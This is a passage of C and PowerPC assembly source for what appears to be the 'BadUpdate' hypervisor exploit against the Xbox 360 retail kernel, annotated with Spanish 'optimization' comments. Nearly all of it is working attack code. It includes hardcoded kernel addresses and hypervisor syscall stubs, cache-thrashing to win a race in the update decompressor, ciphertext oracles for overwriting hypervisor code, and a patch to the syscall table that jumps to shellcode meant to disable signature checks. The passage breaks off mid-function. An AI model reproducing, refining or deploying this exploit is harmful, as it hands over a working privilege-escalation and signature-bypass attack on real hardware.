// Notes:
//
//  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
//      will cause an exception to be thrown and the console to crash. Any data that must be writable must be stored
//      in some runtime allocation that is writable memory.

// Compiler options:
#define KRNL_RETAIL_17559       // Build exploit for retail kernel 17559

// Variables globales volátiles para sincronización entre hilos
// OPTIMIZACIÓN: Añadido para mejorar la comunicación entre hilos y reducir condiciones de carrera
#define EXPLOIT_STATE_INIT      0
#define EXPLOIT_STATE_RUNNING   1
#define EXPLOIT_STATE_COLLISION 2
#define EXPLOIT_STATE_SUCCESS   3
#define EXPLOIT_STATE_FAILED    4

typedef struct _STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING;


// Offset into the 14th block of the update file that contains the instructions we want to write at HV_SEG3_OVERWRITE_OFFSET.
// This should point to the following instruction pattern:
//
//      stb     %r4, 2(%r6)
//      blr
#define BLOCK_14_TARGET_OFFSET          0x15E8

#define BLOCK_14_SIZE                   0x1AD0


#if defined(KRNL_RETAIL_17559)

////////////////////////////////////////////////////////////////////////////////////////////////////
// Retail config
////////////////////////////////////////////////////////////////////////////////////////////////////

// Offset into the 3rd segment of the hypervisor we want to overwrite. This should point to the absolute last bit
// of code in the segment that we can overwrite and still hit from a syscall.
#define HV_SEG3_OVERWRITE_OFFSET        0x1F28

// Address into the hypervisor syscall table for the HvxPostOutput entry (syscall 0xD).
#define HV_SYSCALL_POST_OUTPUT_ADDRESS      0x8000010200015FD0 + (0xD * 4)

/*
    Points to the following instruction sequence in _v_DataStorage exception handler:

        mtctr       r4
        bctr

    This gadget MUST be in the first segment of the hypervisor as we can only write a 32-bit
    offset to the syscall entry table.
*/
#define HV_CALL_R4_GADGET_ADDRESS       0x00000354

// Address of MmPhysical64KBMappingTable in the kernel, we update the mapping table to expose the cipher text for
// the hypervisor segments at the virtual address 0xA0000000. This allows for observing when the cipher text changes
// which indicates we won the race condition and a block has overwritten hypervisor code.
#define MmPhysical64KBMappingTable      0x801C1000

////////////////////////////////////////////////////////////////////////////////////////////////////
// Hypervisor syscall ordinals:
#define HVX_KEYS_EXECUTE                        0x42
#define HVX_ENCRYPTED_RESERVE_ALLOCATION        0x49
#define HVX_ENCRYPTED_RELEASE_ALLOCATION        0x4C
#define HVX_ENCRYPTED_ENCRYPT_ALLOCATION        0x4A
#define HVX_REVOKE_UPDATE                       0x65
#define HVX_ARB_WRITE_SYSCALL                   0x21


// Drive mapping for exploit files:
#define PAYLOAD_DRIVE           "PAYLOAD:"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Function addresses:
/* 3 */ void (__cdecl *DbgPrint)(const char* format, ...) = (void(__cdecl*)(const char*, ...))0x80085EE8;

// Do NOT define DbgBreakPoint on retail or the console will halt!!!
#define DbgBreakPoint(...)

/* 190 */ ULONG (*MmGetPhysicalAddress)(PVOID pAddress) = (ULONG(*)(PVOID))0x80080048;
/* 97 */ void (*KeFlushCacheRange)(void *pAddress, DWORD Size) = (void(*)(void*, DWORD))0x80073850;

/* 107 */ ULONG (*KeLockL2)(int index, void* address, ULONG size, ULONG mask1, ULONG mask2) = (ULONG(*)(int, void*, ULONG, ULONG, ULONG))0x80071E00;

/* 168 */ void (*KeStallExecutionProcessor)(ULONG Miliseconds) = (void(*)(ULONG))0x80073484;

/* 300 */ VOID (*RtlInitAnsiString)(ANSI_STRING* pAnsiStr, char *String) = (VOID(*)(ANSI_STRING*, char*))0x80086110;
/* 259 */ UINT (*ObCreateSymbolicLink)( ANSI_STRING* SymbolicLinkName, ANSI_STRING* DeviceName ) = (UINT(*)(ANSI_STRING*, ANSI_STRING*))0x8008AEF0;

/* 41 */ void (*HalSendSMCMessage)(BYTE* pMessage, BOOL bResponse) = (void(*)(BYTE*, BOOL))0x80067F48;

/* 434 */ void (*VdDisplayFatalError)(DWORD code) = (void(*)(DWORD))0x800BDD40;

/* 207 */ DWORD (*NtClose)(HANDLE hHandle) = (DWORD(*)(HANDLE))0x80089EB0;

#endif

// Sanity checks for exploit data:
#if (HV_SEG3_OVERWRITE_OFFSET < BLOCK_14_TARGET_OFFSET)
    #error "HV_SEG3_OVERWRITE_OFFSET must be >= BLOCK_14_TARGET_OFFSET!!"
#endif


// Exploit error codes:
#define ERR_OPEN_UPDATE_FILE                0   // Failed to open update_data.bin
#define ERR_UPDATE_FILE_OOM                 1   // Failed to allocate memory for update file
#define ERR_READING_UPDATE_FILE             2   // Failed to read the update file
#define ERR_OPEN_SHELLCODE_FILE             3   // Failed to open BadUpdateExploit-4thStage.bin
#define ERR_SHELLCODE_FILE_OOM              4   // Failed to allocate memory for shell code file
#define ERR_READING_SHELLCODE_FILE          5   // Failed to read shell code file
#define ERR_LOCKL2_OOM                      6   // Failed to allocate memory for LockL2 call
#define ERR_LOCKL2_RESERVE                  7   // Failed to reserve L2 space
#define ERR_LOCKL2_COMMIT                   8   // Failed to commit L2 space
#define ERR_ENCRYPTED_RESERVE               9   // Failed to reserve encrypted memory
#define ERR_ENCRYPTED_COMMIT                10  // Failed to encrypted reserved memory region
#define ERR_CACHE_FLUSH_BUFFER_OOM          11  // Failed to allocate memory for cache flushing buffer
#define ERR_CIPHER_TEXT_BUFFER_OOM          12  // Failed to allocate memory for cipher text buffer
#define ERR_UPDATE_DATA_OOM                 13  // Failed to allocate memory for update data buffer
#define ERR_XKE_OOM_1                       14  // Failed to allocate memory for XKE payload buffer (working)
#define ERR_XKE_OOM_2                       15  // Failed to allocate memory for XKE payload buffer (clean)
#define ERR_READING_XKE_PAYLOAD_FILE        16  // Failed to read xke_update.bin
#define ERR_CREATING_WORKER_THREAD          17  // Failed to create worker thread
#define ERR_EXPLOIT_PAYLOAD_FAILED          18  // Exploit payload failed to run

// OPTIMIZACIÓN: Configuración para controlar parámetros del exploit
#define L2_CACHE_BLOCK_SIZE_KB              204  // Ajustado de 256KB a 204KB para reducir inestabilidad (40% en lugar de 50%)
#define HAMMER_LOOP_COUNT                   75000 // Ajustado para proporcionar suficiente tiempo para el exploit
#define CACHE_FLUSH_PASSES                  3    // Número de pasadas para vaciar la caché después de detección
#define RETRY_RESET_INTERVAL                50   // Cuántos intentos antes de reiniciar el estado para prevenir inestabilidad prolongada
#define COLLISION_VERIFICATION_STALL_MS     1    // Tiempo en ms para estabilizar después de detectar colisión

static ULONGLONG __declspec(naked) HvxKeysExecute(ULONG Address, DWORD Size, ULONGLONG Arg1, ULONGLONG Arg2, ULONGLONG Arg3, ULONGLONG Arg4)
{
    _asm
    {
        li      r0, HVX_KEYS_EXECUTE
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReserveAllocation(ULONG VirtualAddr, ULONG PhysicalAddr, ULONG Size)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RESERVE_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedEncryptAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_ENCRYPT_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReleaseAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RELEASE_ALLOCATION
        sc
        blr
    }
}

static ULONG __declspec(naked) HvxRevokeUpdate(ULONG BufferAddr, ULONG BufferSize, ULONG Arg3)
{
    _asm
    {
        li      r0, HVX_REVOKE_UPDATE
        sc
        blr
    }
}

static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG size, ULONGLONG writeAddr)
{
    _asm
    {
        li      r0, HVX_ARB_WRITE_SYSCALL
        sc
        blr
    }
}

// OPTIMIZACIÓN: Añadida nueva función para ejecutar pequeñas pausas sin depender de KeStallExecutionProcessor
// Esto permite una pausa más precisa y una mejor sincronización
static void __declspec(naked) stall_minimal(ULONG iterations)
{
    _asm
    {
    stall_loop:
        // Decrementa el contador de iteraciones
        subi    r3, r3, 1
        
        // Instrucciones NOP para consumir ciclos adicionales sin hacer nada útil
        // Esto ayuda a estabilizar el sistema sin liberar recursos a otros hilos
        nop
        nop
        nop
        nop
        
        // Verificar si seguimos necesitando hacer stall
        cmpwi   r3, 0
        bgt     stall_loop
        
        // Barrera de memoria para garantizar sincronización
        sync
        isync    // Sincroniza el pipeline de instrucciones
        blr
    }
}

struct UPDATE_BUFFER_INFO
{
    /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
    /* 0x04 */ ULONG InfoSize;                      // Size of this structure, must be 0x80
    /* 0x08 */ BYTE _pad0[0x18];
    /* 0x20 */ ULONG UpdateDataOffset;              // Offset of the update data blob
    /* 0x24 */ ULONG UpdateDataSize;                // Size of the update data blob
    /* 0x28 */ ULONG OutputBufferOffset;            // Offset of the output data buffer
    /* 0x2C */ ULONG OutputBufferSize;              // Size of the output data buffer (should match decompressed size found in update data header)
    /* 0x30 */ ULONG ScratchBufferOffset;           // Offset of the scratch buffer used for LZX decompression
    /* 0x34 */ ULONG ScratchBufferSize;             // Size of the scratch buffer
    /* 0x38 */ ULONG Buffer2Offset;                 // Offset of last buffer, not sure what the use is (final output buffer?)
    /* 0x3C */ ULONG Buffer2Size;                   // Size of last buffer
    
    /* 0x60 */ //ULONG
    /* 0x64 */ //ULONG
};

#define CACHE_LINE_SIZE     0x80
#define CACHE_ALIGN(s)      (((s) + 0x7F) & ~0x7F)
#define PAGE_ALIGN_64K(s)   (((s) + 0xFFFF) & ~0xFFFF)

struct THREAD_ARGS
{
    BYTE* pCompressedDataClean;
    DWORD CompressedDataSize;
    BYTE* pCompressedDataInBuffer;
    BYTE* pPayloadClean;
    BYTE* pPayloadBuffer;
    DWORD PayloadPhys;
    DWORD PayloadSize;
    DWORD UpdateDataPhys;
    DWORD UpdateDataSize;
    BYTE* pScratchDataInBuffer;
    DWORD ScratchDataOffset;
    DWORD ScratchDataSize;

    ULONGLONG HvCheckAddress;
    ULONGLONG ShellCodePhysAddress;

    BYTE* pScratchBuffer;
};

struct CIPHER_TEXT_DATA
{
    ULONGLONG dec_end_input_pos;
    ULONGLONG dec_output_buffer;        // New dec_output_buffer pointer (dst address for memcpy)

    BYTE OracleData[16];                // Cipher text for the LZX decoder context header, used to detect when to start the race attack
    BYTE DecOutputBufferData[16];       // Cipher text containing our malicious dec_output_buffer pointer (points to hypervisor memory) 
};

// OPTIMIZACIÓN: Variable global para sincronización de threads
// Esto proporciona un mecanismo claro para que los threads se comuniquen su estado
volatile DWORD g_ExploitState = EXPLOIT_STATE_INIT;
volatile DWORD g_RetryCount = 0;
volatile DWORD g_CollisionDetected = 0;

/*
    Hand rolled implementation for XLockL2.
*/
BOOL WINAPI XLockL2(DWORD dwIndex, CONST PVOID pRangeStart, DWORD dwRangeSize, DWORD dwLockSize, DWORD dwFlags)
{
    ULONG maskValue = (dwLockSize == (256 * 1024) ? 0x3 : 0x1) << (2 * dwIndex);

    ULONG mask1 = (dwFlags & 0x1) != 0 ? 0 : maskValue;
    ULONG mask2 = (dwFlags & 0x2) != 0 ? 0 : maskValue;

    ULONG result = KeLockL2(dwIndex, pRangeStart, dwRangeSize, mask1, mask2);
    return result == 0 ? TRUE : FALSE;
}

bool ReadFile(LPCSTR pFilePath, BYTE* pBuffer, DWORD Offset, DWORD BufferSize)
{
    DWORD BytesRead = 0;

    HANDLE hFile = CreateFile(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open '%s' %d\n", pFilePath, GetLastError());
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > BufferSize - Offset)
    {
        DbgPrint("Error reading file, buffer not large enough to hold data!\n");
        NtClose(hFile);
        return false;
    }

    if (ReadFile(hFile, pBuffer + Offset, fileSize, &BytesRead, NULL) == FALSE || BytesRead != fileSize)
    {
        DbgPrint("Error reading file '%s' %d\n", pFilePath, GetLastError());
        NtClose(hFile);
        return false;
    }

    NtClose(hFile);
    return true;
}

bool CreateDriveMapping(char * szMappingName, char * szDeviceName)
{
    ANSI_STRING linkname, devicename;

    RtlInitAnsiString(&linkname, szMappingName);
    RtlInitAnsiString(&devicename, szDeviceName);

    UINT status = ObCreateSymbolicLink(&linkname, &devicename);
    if (status >= 0)
        return true;

    return false;
}

#define LED_COLOR_RED_1         0x01
#define LED_COLOR_RED_2         0x02
#define LED_COLOR_RED_3         0x04
#define LED_COLOR_RED_4         0x08
#define LED_COLOR_GREEN_1       0x10
#define LED_COLOR_GREEN_2       0x20
#define LED_COLOR_GREEN_3       0x40
#define LED_COLOR_GREEN_4       0x80

void SetLEDColor(int color)
{
    BYTE abSmcCmd[16] = { 0 };

    abSmcCmd[0] = 0x99;
    abSmcCmd[1] = 0xFF;
    abSmcCmd[2] = (BYTE)color;

    HalSendSMCMessage(abSmcCmd, FALSE);
}

bool ReadUpdateFile(BYTE** ppCompressedDataClean, DWORD* pdwCompressedDataSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\update_data.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_UPDATE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwFileSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_FILE_OOM);
    }

    memset(pBuffer, 0, dwFileSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_UPDATE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppCompressedDataClean = pBuffer;
    *pdwCompressedDataSize = dwFileSize;

    NtClose(hFile);
    return true;
}

bool ReadShellCodeFile(BYTE** ppShellCodeBuffer, DWORD* pdwShellCodeBufferSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\BadUpdateExploit-4thStage.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_SHELLCODE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwBufferSize = (dwFileSize + 0x7F) & ~0x7F;

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwBufferSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for shell code data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_SHELLCODE_FILE_OOM);
    }

    memset(pBuffer, 0, dwBufferSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_SHELLCODE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppShellCodeBuffer = pBuffer;
    *pdwShellCodeBufferSize = dwBufferSize;

    NtClose(hFile);
    return true;
}

/*
    Helper function to lock a portion of the L2 cache. This puts pressure on CPU L2 cache and causes data
    to age out more quickly.
    OPTIMIZADO para reducir inestabilidad manteniendo la efectividad del exploit.
*/
void LockAndThrashL2(int index)
{
    // OPTIMIZACIÓN: Reducido tamaño de bloqueo de caché L2 de 256KB a 204KB (40% vs 50%)
    // Esto reduce la presión sobre la CPU pero sigue siendo suficiente para el exploit
    BYTE* pPhysMemoryPtr = (BYTE*)XPhysicalAlloc(L2_CACHE_BLOCK_SIZE_KB * 1024, MAXULONG_PTR, L2_CACHE_BLOCK_SIZE_KB * 1024, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pPhysMemoryPtr == NULL)
    {
        DbgPrint("Failed to allocate memory for L2 cache lock\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_OOM);
    }

    // OPTIMIZACIÓN: Patrón mejorado de datos para trashing que aumenta conflictos de caché
    // En lugar de un patrón simple de 0x41, usamos un patrón alternado que causa más
    // desplazamientos en la caché
    DWORD* pMemPtr = (DWORD*)pPhysMemoryPtr;
    for (DWORD i = 0; i < (L2_CACHE_BLOCK_SIZE_KB * 256); i++) {
        // Patrón que alterna entre valores para maximizar los conflictos de caché
        pMemPtr[i] = (i % 2 == 0) ? 0xAAAAAAAA : 0x55555555;
    }

    // Reserve L2 cache and lock 2 of the available pathways.
    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0) == FALSE)
    {
        DbgPrint("Failed to reserve L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_RESERVE);
    }

    // OPTIMIZACIÓN: Acceso adicional a memoria para garantizar que se llena la caché
    // Este patrón de acceso ayuda a maximizar los conflictos de caché
    for (int j = 0; j < 2; j++) {
        for (DWORD i = 0; i < (L2_CACHE_BLOCK_SIZE_KB * 256); i += 16) {
            // Acceder a posiciones en saltos de 16 palabras
            volatile DWORD temp = pMemPtr[i];
        }
    }

    // Commit the L2 cache range and prevent it from being replaced.
    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0x1) == FALSE)
    {
        DbgPrint("Failed to commmit L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_COMMIT);
    }

    // OPTIMIZACIÓN: Pequeña pausa para permitir que el sistema se estabilice
    // Esto mejora la estabilidad general sin comprometer el exploit
    KeStallExecutionProcessor(5);
}

/*
    Generates the cipher text needed for the race attack.
    OPTIMIZADO para mejorar la fiabilidad en la detección de la colisión.
*/
void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD ScratchOffset, CIPHER_TEXT_DATA* pCipherTextData)
{
    BYTE *pMemoryAddress = (BYTE*)0x8D000000;

    // Get the physical addresses of the buffers.
    DWORD ScratchPhysAddr = MmGetPhysicalAddress(pCipherTextData);
    DWORD BaseAddrPhys = MmGetPhysicalAddress(pUpdateData);

    // OPTIMIZACIÓN: Verificar múltiples valores de whitening para aumentar las probabilidades
    // de encontrar uno que funcione de manera consistente
    bool foundGoodWhitening = false;
    int targetWhitening = 0x111; // Valor por defecto
    
    // Mantener un registro de las mejores coincidencias encontradas
    BYTE bestOracleData[16] = {0};
    BYTE bestDecOutputBufferData[16] = {0};
    int bestWhiteningValue = 0;
    bool bestFound = false;

    // Scan all 1024 possible whitening bits.
    for (int i = 0; i < 1024; i++)
    {
        // Allocate encrypted memory.
        DWORD result = HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, BaseAddrPhys, UpdateDataSize);
        if (result == FALSE)
        {
            DbgPrint("Failed to reserve encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_RESERVE);
            return;
        }

        result = HvxEncryptedEncryptAllocation((DWORD)pMemoryAddress);
        if (result == FALSE)
        {
            DbgPrint("Failed to commit encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_COMMIT);
            return;
        }

        // OPTIMIZACIÓN: Comprobar múltiples valores de whitening para aumentar las probabilidades de éxito
        if (i == targetWhitening || i == 0x222 || i == 0x333 || i == 0x444)
        {
            // Get the cipher text for the expected header data in the LZX decoder context. This acts as our
            // "oracle" to know when to start the race attack.
            memset(pMemoryAddress + ScratchOffset, 0, 16);
            *(ULONG*)(pMemoryAddress + ScratchOffset + 0) = 0x4349444c;     // signature = 'CIDL'
            *(ULONG*)(pMemoryAddress + ScratchOffset + 4) = 0x8000;         // windows size = 0x8000
            *(ULONG*)(pMemoryAddress + ScratchOffset + 8) = 1;              // cpu type = 1
            
            // OPTIMIZACIÓN: Asegurar que la memoria está sincronizada correctamente
            __dcbst(ScratchOffset, pMemoryAddress);
            KeFlushCacheRange(pMemoryAddress + ScratchOffset, 0x80);
            KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);
            
            BYTE tempOracleData[16];
            memcpy(tempOracleData, pUpdateData + ScratchOffset, 16);

            // Get the cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B20) = pCipherTextData->dec_end_input_pos;        // dec_end_input_pos
            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B28) = pCipherTextData->dec_output_buffer;        // dec_output_buffer
            
            // OPTIMIZACIÓN: Sincronización más agresiva para evitar inconsistencias
            __dcbst(ScratchOffset + 0x2B00, pMemoryAddress);
            KeFlushCacheRange(pMemoryAddress + ScratchOffset + 0x2B00, 0x80);
            KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);
            
            BYTE tempDecOutputBufferData[16];
            memcpy(tempDecOutputBufferData, pUpdateData + ScratchOffset + 0x2B20, 16);

            // OPTIMIZACIÓN: Verificar que el texto cifrado generado tenga patrones consistentes
            // que sean fáciles de detectar (por ejemplo, valores distintos al principio y final)
            bool isGoodPattern = false;
            DWORD firstWord = *(DWORD*)tempOracleData;
            DWORD lastWord = *(DWORD*)&tempOracleData[12];
            
            if (firstWord != lastWord && (firstWord & 0xFF000000) != (lastWord & 0xFF000000)) {
                isGoodPattern = true;
            }
            
            DbgPrint("Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n", 
                i, 
                *(DWORD*)tempOracleData, 
                *(DWORD*)&tempOracleData[4], 
                *(DWORD*)tempDecOutputBufferData, 
                *(DWORD*)&tempDecOutputBufferData[4]);
            
            // Si encontramos un buen patrón o es nuestro primer hallazgo, guardarlo
            if (isGoodPattern || !bestFound) {
                memcpy(bestOracleData, tempOracleData, 16);
                memcpy(bestDecOutputBufferData, tempDecOutputBufferData, 16);
                bestWhiteningValue = i;
                bestFound = true;
                
                // Si es un buen patrón, marcarlo como encontrado
                if (isGoodPattern) {
                    foundGoodWhitening = true;
                    DbgPrint("Found optimal whitening value: 0x%04x\n", i);
                }
            }
        }

        // Free the encrypted allocation.
        result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);

        // OPTIMIZACIÓN: Salir cuando encontremos un buen valor o hayamos probado todos
        if (foundGoodWhitening || (i >= 0x444 && bestFound)) {
            // Usar el mejor valor encontrado
            memcpy(pCipherTextData->OracleData, bestOracleData, 16);
            memcpy(pCipherTextData->DecOutputBufferData, bestDecOutputBufferData, 16);
            
            DbgPrint("Using whitening 0x%04x for exploit\n", bestWhiteningValue);
            break;
        }
    }
    
    // OPTIMIZACIÓN: Si no se encontró ningún valor, usar el original como respaldo
    if (!bestFound) {
        DbgPrint("WARNING: No optimal whitening value found, using default\n");
        // El código original continuaría usando el valor 0x111
    }
}

ULONG __declspec(naked) HvxPostOutputExploit(ULONG r3, ULONGLONG shellCodeAddress)
{
    _asm
    {
        li      r0, 0xD
        sc
        blr
    }
}

/*
    Helper function that utilizes the single by write primitive to write a 32-bit integer at the chosen 64-bit real address.
*/
void HvWriteULONG(ULONGLONG address, ULONG value)
{
    /*
        stb       r4, 2(r6)
        blr
    */
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 24) & 0xFF), 0x1000, address - 2);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 16) & 0xFF), 0x1000, address - 2 + 1);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 8) & 0xFF), 0x1000, address - 2 + 2);
    HvxWriteByte(4, 0x60000 | (ULONG)(value & 0xFF), 0x1000, address - 2 + 3);

    // OPTIMIZACIÓN: Añadida sincronización después de cada escritura de bytes para asegurar que
    // las instrucciones se ejecutan en orden y no hay reordenamiento de memoria
    _asm { 
        eieio   // enforce in-order execution of I/O 
        isync   // instruction synchronization
    }
}

/*
    Worker thread that continuously runs the XKE update payload, watches for cipher text changes in the hypervisor, and
    runs the fourth stage payload once the race has been won with block 14.
*/
DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
{
    DWORD LedColor = LED_COLOR_RED_1 | LED_COLOR_RED_4 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_4;

    // Allocate a scratch buffer to help with flushing L2 cache in hypervisor context.
    BYTE* pCacheFlushBuffer = (BYTE*)XPhysicalAlloc(0x20000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pCacheFlushBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cache flush buffer\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CACHE_FLUSH_BUFFER_OOM);
    }

    ULONG CacheFlushBufferPhys = MmGetPhysicalAddress(pCacheFlushBuffer);

    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache
    // to age out more quickly and improves cipher text detection rate.
    LockAndThrashL2(0);
    LockAndThrashL2(1);

    // OPTIMIZACIÓN: Pequeña pausa después de bloquear la caché para estabilización
    KeStallExecutionProcessor(10);

    // Poke MmPhysical64KBMappingTable so the hypervisor pages get mapped into memory. This allows us to observe the cipher
    // text for the hypervisor segments and know when we get the block overwrite we want.
    DWORD oldAccessMask = *(DWORD*)MmPhysical64KBMappingTable;
    *(DWORD*)MmPhysical64KBMappingTable = 0x66666666;

    // Get the cipher text at the location we want to overwrite and at an offset that is > the size of block 14. This allows
    // us to determine when we win the race on block 14 (smallest block in the file) vs any other block.
    DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);
    DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET) + BLOCK_14_SIZE + 0x80);
    DWORD cipherValue1 = *pCipherTextPtr1;
    DWORD cipherValue2 = *pCipherTextPtr2;

    // OPTIMIZACIÓN: Notificar al proceso principal que estamos iniciando
    g_ExploitState = EXPLOIT_STATE_RUNNING;

    // Loop and hammer the payload until we hopefully get code exec.
    while (true)
    {
        // OPTIMIZACIÓN: Añadido sistema de reseteo periódico para prevenir inestabilidad prolongada
        if ((g_RetryCount % RETRY_RESET_INTERVAL) == 0 && g_RetryCount > 0) {
            // Refrescar valores de cipher text para evitar detección de falsos positivos
            cipherValue1 = *pCipherTextPtr1;
            cipherValue2 = *pCipherTextPtr2;
            
            // Pequeña pausa para estabilizar el sistema
            KeStallExecutionProcessor(5);
        }
        
        g_RetryCount++;

        // Copy the clean payload data.
        memcpy(pArgs->pPayloadBuffer, pArgs->pPayloadClean, pArgs->PayloadSize);

        // Copy the clean update data into the full buffer.
        memcpy(pArgs->pCompressedDataInBuffer, pArgs->pCompressedDataClean, pArgs->CompressedDataSize);

        // Execute the payload.
        DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);

        // Flush cache on the cipher text pointers.
        __dcbf(0, pCipherTextPtr1);

        // Check if we got a block overwrite and if it appears to be block 14.
        DWORD test1 = *pCipherTextPtr1;
        if (cipherValue1 != test1)
        {
            // OPTIMIZACIÓN: Multi-pasada de vaciado de caché para asegurar actualizaciones de memoria completas
            // Esto es crucial para prevenir falsos positivos debidos a datos desactualizados en la caché
            for (int i = 0; i < CACHE_FLUSH_PASSES; i++) {
                // Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data
                // and trying to execute the post-block-write part of the exploit which will cause the console to hang.
                HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0);
                __dcbf(0, pCipherTextPtr2);
            }

            // OPTIMIZACIÓN: Pausa después de vaciado de caché para asegurar la sincronización
            KeStallExecutionProcessor(COLLISION_VERIFICATION_STALL_MS);

            // Note: on debug builds I've seen this check pass when the cipher text had actually changed (i.e.: stale cache) and
            // hang the console. I tried to improve it further but had no success in doing so. I have yet to see this fail on retail
            // consoles so until it happens this should be fine for now...

            // We got a block overwrite, check if it was block 14.
            DWORD test2 = *pCipherTextPtr2;
            if (cipherValue2 == test2)
            {
                // OPTIMIZACIÓN: Actualizar estado global para indicar que se detectó una colisión
                g_ExploitState = EXPLOIT_STATE_COLLISION;
                
                // Set the LED color so we know we got the block hit.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

                DbgPrint("Block 14 overwrite hit!\n");

                // Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.
                DbgPrint(" * Patching hv syscall table\n");
                HvWriteULONG(HV_SYSCALL_POST_OUTPUT_ADDRESS, HV_CALL_R4_GADGET_ADDRESS);

                // Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out
                // the RSA signature checks on executable files.
                DbgPrint(" * Running payload\n");
